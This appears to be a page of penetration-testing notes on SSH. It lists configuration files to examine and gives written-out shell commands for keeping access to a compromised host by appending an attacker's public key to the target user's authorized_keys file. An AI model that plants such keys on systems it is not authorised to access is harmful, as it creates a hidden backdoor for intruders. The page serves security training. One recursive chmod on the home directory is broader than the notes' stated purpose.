# 22\_SSH

## Examine Configuration Files

* ssh\_config
* sshd\_config
* autorized\_keys
* ssh\_known\_hosts
* .shosts

## Establish Persistence

If ssh open, you can add your attacker box public key to the machine so that you can ssh into it on-demand.

* Note that this only works if the target user you have a shell on has an interactive login shell\(/bin/sh, /bin/bash\) assigned to their user in the passwd file.
* \(Target\) See if there is a .ssh folder in the home directory of the target user.  If not, create one.

  ```text
  ls -lat ~
  mkdir ~/.ssh
  ```

* \(Target\) Ensure that there is an authorized\_keys file within the .ssh folder.

  ```text
  ls -lat ~/.ssh
  cd ~/.ssh; touch authorized_keys
  ```

* \(Target\) Ensure that the file permissions on the target user home folder \(~\), .ssh directory \(~/.ssh\), and authorized\_keys file \(~/.ssh/authorized\_keys\) are only writable by the target user \(no other groups or gloabl\) and readable by at least the target user.  If not, change the permissions to ensure this.

  ```text
  chmod 755 ~ -R
  ```

* \(Local\) Ensure that you have a public / private key pair generated.  If not, generate one.

  ```text
  ls -lat ~/.ssh
  ssh-keygen
  ```

* \(Local\) Ensure the permissions on your private key \(file with id prefix without the .pub suffix\) is only readable and writeable by you.

  ```text
  chmod 600 ~/.ssh/[private key file like id_rsa]
  ```

* \(Local and Target\) Copy the public key \(file with id prefix with the .pub suffix\) from our local machine to the authorized\_keys file on the target system.

  ```text
  #Local# cat ~/.ssh/[public keyfile like id_rsa.pub]|clip
  #Target# echo [pasted public key value] >> ~/.ssh/authorized_keys
  ```

* \(Local\) Attempt an ssh login to the target machine as the target user.

  ```text
  ssh -i ~/.ssh/[private key like id_rsa] [target user]@[target IP]
  ```

